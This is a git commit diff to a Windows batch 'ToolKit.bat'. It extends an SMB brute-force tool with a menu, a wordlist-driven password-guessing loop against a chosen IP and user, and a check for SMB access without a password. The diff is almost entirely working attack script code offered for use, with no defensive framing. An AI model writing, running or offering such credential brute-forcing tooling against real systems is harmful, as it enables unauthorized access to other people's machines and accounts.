f598d73372b2d5c2c7da4ff9519576256e67cb07
leox00 <146089334+leox00@users.noreply.github.com>
2024-04-18 16:23:06 +0200

    Only ip smb
    Added smb bruteforce without user and password

--- ToolKit.bat
+++ ToolKit.bat
@@ -20,9 +20,9 @@ echo       ---------
 echo     1) Pc info
 echo     2) SMB Bruteforce
 echo.
-set /p input=
-if /I "%input%" EQU "1" goto pcinfo
-if /I "%input%" EQU "2" goto smb
+set /p menuinput=
+if /I "%menuinput%" EQU "1" goto pcinfo
+if /I "%menuinput%" EQU "2" goto smb
 echo Not valid Tool. Try again!
 pause
 goto menu
@@ -44,6 +44,23 @@ title SMB Bruteforce
 type "smb.txt"
 echo.
 echo.
+echo       SMB TOOLS
+echo       ---------
+echo     1) With user and password
+echo     2) Only ip (usefull to connect to localhost etc.)
+echo.
+set /p smbinput=
+if /I "%smbinput%" EQU "1" goto smbUsrPsswrd
+if /I "%smbinput%" EQU "2" goto smbOnlyIp
+echo Not valid SMB Tool. Try again!
+pause
+goto smb
+
+:smbUsrPsswrd
+cls
+title SMB Bruteforce User and Password
+type "smb.txt"
+echo.
 set /p ip="Enter the target IP: "
 set /p user="Enter the target user: "
 set /p wordlist="Enter the password list: "
@@ -54,13 +71,34 @@ for /f %%a in (%wordlist%) do (
     call :attempt
 )
 echo.
-echo Password not found! :(
+echo Password not found for %user% %ip%! :(
 pause
 goto menu
-    
+
+:smbOnlyIp
+cls
+title SMB Bruteforce Only Ip
+type "smb.txt"
+echo.
+set /p ip="Enter the target IP: "
+net use \\%ip% >nul 2>&1
+if %errorlevel% EQU 0 (
+    echo.
+    echo Able to connect to %ip% without password!
+    net use \\%ip% /d /y >nul 2>&1
+    pause
+    goto menu
+) else (
+    echo.
+    echo Unable to connect to %ip% without password :(
+    net use \\%ip% /d /y >nul 2>&1
+    pause
+    goto menu
+)
+
 :success
 echo.
-echo Password Found! >> %pass%
+echo Password found for %user% %ip%! >> %pass%
 net use \\%ip% /d /y >nul 2>&1
 pause
 goto menu
